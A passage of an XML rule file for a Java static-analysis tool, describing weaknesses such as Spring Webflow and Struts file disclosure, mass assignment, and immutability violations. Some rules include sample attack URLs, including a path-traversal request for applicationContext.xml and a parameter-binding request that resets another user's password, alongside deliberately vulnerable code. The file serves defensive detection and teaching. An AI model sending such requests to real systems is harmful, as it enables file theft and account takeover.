							  In Spring Webflow, a view resolver is used to translate a view name into an actual rendering technology. Typically a view resolver will limit the type and location of the files using prefixes and suffixes. However, using request parameters specify the view name allows this mechanism to be circumvented.<br><b>Example 1:</b> The following Spring Webflow configurations uses request parameters to specify the view name.<br><pre><br>&lt;webflow:end-state id="finalStep" view="${requestParameters.url}"/&gt;<br>&lt;webflow:view-state id="showView" view="${requestParameters.test}"&gt;<br></pre><br>The default Spring Webflow view resolver is intended to only allow jsp files in &quot;/WEB-INF/views/&quot; to be resolved.<br><pre><br><br>&lt;bean class="org.springframework.web.servlet.view.<br>               InternalResourceViewResolver"&gt;<br>    &lt;property name="prefix" value="/WEB-INF/views/" /&gt;<br>    &lt;property name="suffix" value=".jsp" /&gt;<br>&lt;/bean&gt;<br><br></pre><br>An attacker could use the following URL to view the applicationContext.xml file: &quot;http://www.yourcorp.com/webApp/logic?url=../applicationContext.xml;x=&quot;<br>The <code>InternalResourceViewResolver</code> will take the prefix it is configured with then concatenate the value passed in the view attribute and finally add the suffix.<br>The resulting relative URL, &quot;/WEB-INF/views/../applicationContext.xml;x=.jsp&quot; is passed to the server-side request dispatcher. The semicolon allows the attacker to convert the &quot;.jsp&quot; suffix into a path parameter.  This attack can be used to disclose any file under the web app root.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 552</em> <br></p>
																									   <p>[6] Seth Ladd <em>Expert Spring MVC and Web Flow</em> <br></p>
																									   <p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 073</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[14] Ryan Berg and Dinis Cruz <em>Two Security Vulnerabilities in the Spring Framework's MVC</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_file_disclosure_struts</key>
		<internalKey>API Abuse/File Disclosure/Struts</internalKey>
		<name>File Disclosure: Struts</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Constructing a server-side redirect path with user input could allow an attacker to download application binaries (including application classes or jar files) or view arbitrary files within protected directories.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A file disclosure occur when:<br>1. Data enters a program from an untrusted source.<br><br><br>2. The data is used to dynamically construct a path.<br><br><br><br><b>Example 1:</b> The following code takes untrusted data and uses it to build a path which is used in a server side forward.<br><br><pre><br>...<br>	String returnURL = request.getParameter("returnURL");<br>	return new ActionForward(returnURL);<br>	...<br></pre><br><br>If an attacker provided a URL with the request parameter matching a sensitive file location, they would be able to view that file. For example, &quot;http://www.yourcorp.com/webApp/logic?returnURL=WEB-INF/applicationContext.xml&quot; would allow them to view the applicationContext.xml of the application.<br>Once the attacker had the applicationContext.xml, they could locate and download other configuration files referenced in the applicationContext.xml or even class or jar files. This would allow attackers to gain sensitive information about an application and target it for other types of attack.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 552</em> <br></p>
																									   <p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 073</em> <br></p>
																									   <p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[13] Ryan Berg and Dinis Cruz <em>Two Security Vulnerabilities in the Spring Framework's MVC</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_immutable_classes_field_mutation</key>
		<internalKey>API Abuse/Immutable Classes/Field Mutation</internalKey>
		<name>Immutable Classes: Field Mutation</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The class is annotated as immutable, but a field is mutated.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  This class has been annotated with the annotation Immutable, from the JCIP annotations package. However, one of the mutable fields of the class had a mutating method called on it outside of the constructor and destructor.<br><br><b>Example 1:</b> The following code for an immutable final class mistakenly declares a Set <code>public</code> and <code>final</code>.<br><br><pre><br>@Immutable<br>public final class ThreeStooges {<br>private final Set stooges = new HashSet>();<br>...<br><br>public void addStooge(String name) {<br>stooges.add(name);<br>}<br><br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[2] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 471</em> <br></p>
																									   <p>[3] B. Goetz <em>Java Concurrency in Practice. Chapter 3: Sharing Objects Guidelines</em> <br></p>
																									   <p>[4]  <em>Package net.jcip.annotations Specification</em> <br></p>
																									   <p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_immutable_classes_non_final_fields</key>
		<internalKey>API Abuse/Immutable Classes/Non-final Fields
		</internalKey>
		<name>Immutable Classes: Non-final Fields</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The class is annotated as immutable, but a field is not <code>final</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  This class has been annotated with the annotation Immutable, from the JCIP annotations package. A non-final field violates the immutability of the class by allowing the value to be changed.<br><br><b>Example 1:</b> The following code for an immutable class mistakenly declares a field <code>public</code> and not <code>final</code>.<br><br><pre><br>@Immutable<br>public class ImmutableInteger {<br>public int value;<br><br>}</pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[2] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 471</em> <br></p>
																									   <p>[3] B. Goetz <em>Java Concurrency in Practice. Chapter 3: Sharing Objects Guidelines</em> <br></p>
																									   <p>[4]  <em>Package net.jcip.annotations Specification</em> <br></p>
																									   <p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_immutable_classes_public_mutable_fields</key>
		<internalKey>API Abuse/Immutable Classes/Public Mutable Fields
		</internalKey>
		<name>Immutable Classes: Public Mutable Fields</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The class is annotated as immutable, but a field is mutated.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  This class has been annotated with the annotation Immutable, from the JCIP annotations package. A public field of a mutable type allows code external to the class to modify the contents and violate the immutability of the class.<br><br><b>Example 1:</b> The following code for an immutable final class mistakenly declares a Set <code>public</code> and <code>final</code>.<br><br><pre><br>@Immutable<br>public final class ThreeStooges {<br>public final Set stooges = new HashSet();<br>...<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[2] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 471</em> <br></p>
																									   <p>[3] B. Goetz <em>Java Concurrency in Practice. Chapter 3: Sharing Objects Guidelines</em> <br></p>
																									   <p>[4]  <em>Package net.jcip.annotations Specification</em> <br></p>
																									   <p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_j2ee_bad_practices_sockets</key>
		<internalKey>API Abuse/J2EE Bad Practices/Sockets</internalKey>
		<name>J2EE Bad Practices: Sockets</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Socket-based communication in web applications is prone to error.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The J2EE standard permits the use of sockets only for the purpose of communication with legacy systems when no higher-level protocol is available. Authoring your own communication protocol requires wrestling with difficult security issues, including:<br><br>- In-band versus out-of-band signaling<br><br>- Compatibility between protocol versions<br><br>- Channel security<br><br>- Error handling<br><br>- Network constraints (firewalls)<br><br>- Session management<br><br>Without significant scrutiny by a security expert, chances are good that a custom communication protocol will suffer from security problems.<br><br>Many of the same issues apply to a custom implementation of a standard protocol. While there are usually more resources available that address security concerns related to implementing a standard protocol, these resources are also available to attackers.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 246</em> <br></p>
																									   <p>[2]  <em>Java 2 Platform Enterprise Edition Specification, v1.4</em> Sun Microsystems<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_j2ee_bad_practices_getconnection_</key>
		<internalKey>API Abuse/J2EE Bad Practices/getConnection()
		</internalKey>
		<name>J2EE Bad Practices: getConnection()</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The J2EE standard forbids the direct management of connections.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The J2EE standard requires that applications use the container's resource management facilities to obtain connections to resources.<br><br>For example, a J2EE application should obtain a database connection as follows:<br><br><pre><br>ctx = new InitialContext();<br>datasource = (DataSource)ctx.lookup(DB_DATASRC_REF);<br>conn = datasource.getConnection();<br></pre><br><br>and should avoid obtaining a connection in this way:<br><br><pre><br>conn = DriverManager.getConnection(CONNECT_STRING);<br></pre><br><br>Every major web application container provides pooled database connection management as part of its resource management framework. Duplicating this functionality in an application is difficult and error prone, which is part of the reason it is forbidden under the J2EE standard.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 245</em> <br></p>
																									   <p>[2]  <em>Java 2 Platform Enterprise Edition Specification, v1.4</em> Sun Microsystems<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_mass_assignment_insecure_binder_configuration</key>
		<internalKey>API Abuse/Mass Assignment/Insecure Binder Configuration
		</internalKey>
		<name>Mass Assignment: Insecure Binder Configuration</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The framework binder used for binding the HTTP request parameters to the model class has not been explicitly configured to allow, or disallow certain attributes.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  To ease development and increase productivity, most modern frameworks allow an object to be automatically instantiated and populated with the HTTP request parameters whose names match an attribute of the class to be bound. Automatic instantiation and population of objects speeds up development, but can lead to serious problems if implemented without caution. Any attribute in the bound classes, or nested classes, will be automatically bound to the HTTP request parameters. Malicious users will, therefore, be able to assign a value to any attribute in bound or nested classes, even if they are not exposed to the client through web forms or API contracts.<br><br><b>Example 1: </b>Using Spring MVC with no additional configuration, the following controller method will bind the HTTP request parameters to any attribute in the <code>User</code> or <code>Details</code> classes:<br><br><pre><br>@RequestMapping(method = RequestMethod.POST)<br>public String registerUser(@ModelAttribute("user") User user, BindingResult result, SessionStatus status) {<br>  if (db.save(user).hasErrors()) {<br>    return "CustomerForm";<br>  } else {<br>    status.setComplete();<br>    return "CustomerSuccess";<br>  }<br>}<br></pre><br><br>Where <code>User</code> class is defined as:<br><br><pre><br>public class User {<br>  private String name;<br>  private String lastname;<br>  private int age;<br>  private Details details;<br><br>  // Public Getters and Setters<br>  ...<br>}<br></pre><br><br>and <code>Details</code> class is defined as:<br><br><pre><br>public class Details {<br>  private boolean is_admin;<br>  private int id;<br>  private Date login_date;<br><br>  // Public Getters and Setters<br>  ...<br>}<br></pre><br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 915</em> <br></p>
																									   <p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[7] OWASP <em>Mass assignment</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.2</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[13] Spring <em>Spring MVC Known Vulnerabilities and Issues</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_mass_assignment_request_parameters_bound_into_persisted_objects
		</key>
		<internalKey>API Abuse/Mass Assignment/Request Parameters Bound into
			Persisted Objects
		</internalKey>
		<name>Mass Assignment: Request Parameters Bound into Persisted Objects
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							   Allowing database persistent entities to be auto-populated by request parameters will allow an attacker to create unintended records in association entities or update unintended fields in the entity object.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Persistent objects are bound to the underlying database and updated automatically by the persistence framework, such as Hibernate or JPA. Allowing these objects to be dynamically bound to the request by Spring MVC will allow an attacker to inject unexpected values into the database by providing additional request parameters.<br><b>Example 1:</b> The <code>Order</code>, <code>Customer</code>, and <code>Profile</code> are Hibernate persisted classes.<br><pre><br>public class Order {<br>	String ordered;<br>	List lineItems;<br>	Customer cust;<br>...<br>}<br>public class Customer {<br>	String customerId;<br>	...<br>    Profile p;<br>...<br>}<br>public class Profile {<br>	String profileId;<br>	String username;<br>	String password;<br>	...<br>}<br></pre><br><code>OrderController</code> is the Spring controller class handling the request:<br><pre><br>@Controller<br>public class OrderController {<br>...<br>	@RequestMapping("/updateOrder")<br>	public String updateOrder(Order order) {<br>		...<br>		session.save(order);<br>	}<br>}<br></pre><br>Because command classes are automatically bound to the request, an attacker can use this vulnerability to update another user's password by adding the following request parameters to the request: &quot;http://www.yourcorp.com/webApp/updateOrder?order.customer.profile.profileId=1234&amp;order.customer.profile.password=urpowned&quot;
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 915</em> <br></p>
																									   <p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.2</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[12] Ryan Berg and Dinis Cruz <em>Two Security Vulnerabilities in the Spring Framework's MVC</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_missing_check_against_null</key>
		<internalKey>API Abuse/Missing Check against Null</internalKey>
		<name>Missing Check against Null</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program can dereference a null pointer because it does not check the return value of a function that might return null.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Just about every serious attack on a software system begins with the violation of a programmer's assumptions. After the attack, the programmer's assumptions seem flimsy and poorly founded, but before an attack many programmers would defend their assumptions well past the end of their lunch break.<br><br>Two dubious assumptions that are easy to spot in code are "this function call can never fail" and "it doesn't matter if this function call fails". When a programmer ignores the return value from a function, they implicitly state that they are operating under one of these assumptions.<br><br><br><br><b>Example 1:</b>  The following code does not check to see if the string returned by <code>getParameter()</code> is <code>null</code> before calling the member function <code>compareTo()</code>, potentially causing a null dereference.<br><br><pre><br>String itemName = request.getParameter(ITEM_NAME);<br>	if (itemName.compareTo(IMPORTANT_ITEM)) {<br>		...<br>	}<br>	...<br></pre><br><br><b>Example 2:</b>. The following code shows a system property that is set to <code>null</code> and later dereferenced by a programmer who mistakenly assumes it will always be defined.<br><br><pre><br>System.clearProperty("os.name");<br>...<br>String os = System.getProperty("os.name");<br>if (os.equalsIgnoreCase("Windows 95") )<br>	System.out.println("Not supported");<br></pre><br><br>The traditional defense of this coding error is:<br><br>"I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn't matter whether I handle the error or simply allow the program to die dereferencing a null value."<br><br>But attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II, APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II, APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II, APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II, APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II, APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 253, CWE ID 690</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_missing_check_for_null_parameter</key>
		<internalKey>API Abuse/Missing Check for Null Parameter</internalKey>
		<name>Missing Check for Null Parameter</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This function violates the contract that it must compare its parameter with null.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The Java standard requires that implementations of <code>Object.equals()</code>, <code>Comparable.compareTo()</code>, and <code>Comparator.compare()</code> must return a specified value if their parameters are null. Failing to follow this contract may result in unexpected behavior.<br><br><b>Example 1:</b> The following implementation of the <code>equals()</code> method does not compare its parameter with null.<br><br><pre><br>public boolean equals(Object object)<br>{<br>   return (toString().equals(object.toString()));<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_object_model_violation_erroneous_clone___method</key>
		<internalKey>API Abuse/Object Model Violation/Erroneous clone() Method
		</internalKey>
		<name>Object Model Violation: Erroneous clone() Method</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A <code>clone()</code> method should call <code>super.clone()</code> to obtain the new object.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  All implementations of <code>clone()</code> should obtain the new object by calling <code>super.clone()</code>. If a class fails to follow this convention, a subclass's <code>clone()</code> method will return an object of the wrong type.<br><br><b>Example 1:</b> The following two classes demonstrate a bug introduced by failing to call <code>super.clone()</code>. Because of the way <code>Kibitzer</code> implements <code>clone()</code>, <code>FancyKibitzer</code>'s clone method will return an object of type <code>Kibitzer</code> instead of <code>FancyKibitzer</code>.<br><br><pre><br>public class Kibitzer implements Cloneable {<br>  public Object clone() throws CloneNotSupportedException {<br>    Object returnMe = new Kibitzer();<br>    ...<br>  }<br>}<br><br>public class FancyKibitzer extends Kibitzer<br>                           implements Cloneable {<br>  public Object clone() throws CloneNotSupportedException {<br>    Object returnMe = super.clone();<br>    ...<br>  }<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 580</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_object_model_violation_just_one_of_equals___and_hashcode___defined
		</key>
		<internalKey>API Abuse/Object Model Violation/Just one of equals() and
			hashCode() Defined
		</internalKey>
		<name>Object Model Violation: Just one of equals() and hashCode()
			Defined
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This class overrides only one of <code>equals()</code> and <code>hashCode()</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Java objects are expected to obey a number of invariants related to equality. One of these invariants is that equal objects must have equal hashcodes. In other words, if <code>a.equals(b) == true</code> then <code>a.hashCode() == b.hashCode()</code>.<br><br>Failure to uphold this invariant is likely to cause trouble if objects of this class are stored in a collection. If the objects of the class in question are used as a key in a Hashtable or if they are inserted into a Map or Set, it is critical that equal objects have equal hashcodes.<br><br><b>Example 1:</b> The following class overrides <code>equals()</code> but not <code>hashCode()</code>.<br><br><pre><br>public class halfway() {<br>  public boolean equals(Object obj) {<br>    ...<br>  }<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 581</em> <br></p>
																									   <p>[2] D. H. Hovermeyer <em>FindBugs User Manual</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_object_model_violation_just_one_of_restorestate___and_savestate___defined
		</key>
		<internalKey>API Abuse/Object Model Violation/Just one of
			restoreState() and saveState() Defined
		</internalKey>
		<name>Object Model Violation: Just one of restoreState() and
			saveState() Defined
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This class overrides only one of <code>saveState()</code> and <code>restoreState()</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Any class that inherits the StateHolder interface must implement both <code>saveState(javax.faces.context.FacesContext)</code> and <code>restoreState(javax.faces.context.FacesContext, java.lang.Object)</code> or implement neither of them. Because these two methods have a tightly coupled relationship, it is not permissible to have the <code>saveState(javax.faces.context.FacesContext)</code> and <code>restoreState(javax.faces.context.FacesContext, java.lang.Object)</code> methods reside at different levels of the inheritance hierarchy.<br><br>The following class defines <code>saveState()</code> and not <code>restoreState()</code>, so it is always in error no matter what any class that extends<br>it might do.<br><pre><br>public class KibitzState implements StateHolder {<br>  public Object saveState(FacesContext fc) {<br>    ...<br>  }<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>
																									   <p>[2] Sun Microsystems <em>JavaDoc for StateHolder Interface</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>api-abuse</tag>
	</rule>
	<rule>
		<key>api_abuse_obsolete_deprecated_by_esapi</key>
		<internalKey>API Abuse/Obsolete/Deprecated by ESAPI</internalKey>
		<name>Obsolete: Deprecated by ESAPI</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  ESAPI offers a safer version of this method.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The ESAPI secure coding guidelines contain a list of banned APIs for which a safer alternative is available in ESAPI.<br><br>            <b>The list of banned and substitute API's:</b><br>            <b>Banned 001</b> System.out.println()<br>            <b>Banned 002</b> Throwable.printStackTrace()<br>            <b>Banned 003</b> Runtime.exec()<br>            <b>Banned 004</b> Session.getId()<br>            <b>Banned 005</b> ServletRequest.getUserPrincipal()<br>            <b>Banned 006</b> ServletRequest.isUserInRole()<br>            <b>Banned 007</b> Session.invalidate()<br>            <b>Banned 008</b> Math.Random.*<br>            <b>Banned 009</b> File.createTempFile()<br>            <b>Banned 010</b> ServletResponse.setContentType()<br>            <b>Banned 011</b> ServletResponse.sendRedirect()<br>            <b>Banned 012</b> RequestDispatcher.forward()<br>            <b>Banned 013</b> ServletResponse.addHeader()<br>            <b>Banned 014</b> ServletResponse.addCookie()<br>            <b>Banned 015</b> ServletRequest.isSecure()<br>            <b>Banned 016</b> Properties.*<br>            <b>Banned 017</b> ServletContext.log()<br>            <b>Banned 018</b> java.security and javax.crypto<br>            <b>Banned 019</b> java.net.URLEncoder/Decoder<br>            <b>Banned 021</b> ServletResponse.encodeURL<br>            <b>Banned 022</b> ServletResponse.encodeRedirectURL<br>            <b>Banned 023</b> javax.servlet.ServletInputStream.readLine
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP2060.4 CAT II</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP2060.4 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP2060.4 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP2060.4 CAT II</em> <br></p>
